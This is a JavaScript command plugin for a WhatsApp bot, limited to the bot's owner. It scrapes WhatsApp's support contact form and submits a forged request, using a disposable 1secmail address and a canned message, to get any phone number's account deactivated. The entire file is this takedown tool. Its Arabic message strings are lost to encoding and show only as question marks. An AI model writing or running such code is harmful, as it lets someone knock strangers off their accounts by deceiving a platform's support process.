import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
    const q = args.join(" ")
    if (!q || !args[0]) throw '*?? ?? ?????? ???? ??? ???????? ???? ???? ?????!*'
    let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
    let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
    let cookie = ntah.headers["set-cookie"].join("; ")
    let $ = cheerio.load(ntah.data)
    let $form = $("form")
    let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
    let form = new URLSearchParams()
    form.append("jazoest", $form.find("input[name=jazoest]").val())
    form.append("lsd", $form.find("input[name=lsd]").val())
    form.append("step", "submit")
    form.append("country_selector", "EG")  // ???? ???
    form.append("phone_number", q)
    form.append("email", email.data[0])
    form.append("email_confirm", email.data[0])
    form.append("platform", "ANDROID")
    form.append("your_message", "???? ?????: ??? ?????? ?????: " + q)
    form.append("__user", "0")
    form.append("__a", "1")
    form.append("__csr", "")
    form.append("__req", "8")
    form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
    form.append("dpr", "1")
    form.append("__ccg", "UNKNOWN")
    form.append("__rev", "1006630858")
    form.append("__comment_req", "0")
    let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
    var payload = String(res.data)
    if (payload.includes(`"payload":true`)) {
        m.reply(`##- ??? ?????? -##\n\n?? ??????\n\n????? ??? ??????.\n\n????? ?? ?????? ?????. ?? ????? ?? ????? ????? ????? ?????? ??????? ???????? ???? 30 ??? ?? ?? ????? ???? ???. ??? ????: ???? ????? ?? ?????? ?? ????? ???? ????? ??????.\n\n???? ???? ???????:\n- ???? ????? ?? ?????? ?????? ???? ??????.\n- ?? ????? ???? ????? ??????? ????? ?? ???? ?????? ??? 30 ???.\n\n?? ???? ???? ?????? ??? ??? ???? ?????.\n??? ????? ?? ???? ?? ???? ????? ????? ???? ?????? ?? ????? SMS ?? ?????? ????????.\n?? ???? ?? ????????? ?????? ????? ?????. ????? ??????? ??????!`)
    } else if (payload.includes(`"payload":false`)) {
        m.reply(`##- ??? ?????? -##\n\n?? ??????\n\n????? ??? ??????.\n\n????? ???? ????? ???? ????? ?? ????? ?? ?????. ?? ????? ??????? ????? ???? ?????? ????? ?? ?????? ???????? ?? ??? ??????.\n\n????? ??? ???? ??? ??????? ??????? ??????? ???????. ????? ?? ????????? ?? ?????? ???????? ??? ?????? ??.\n\n?? ???? ?? ????????? ?????? ????? ?????. ????? ??????? ??????.`)
    } else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.tags = ['owner']
handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true
export default handler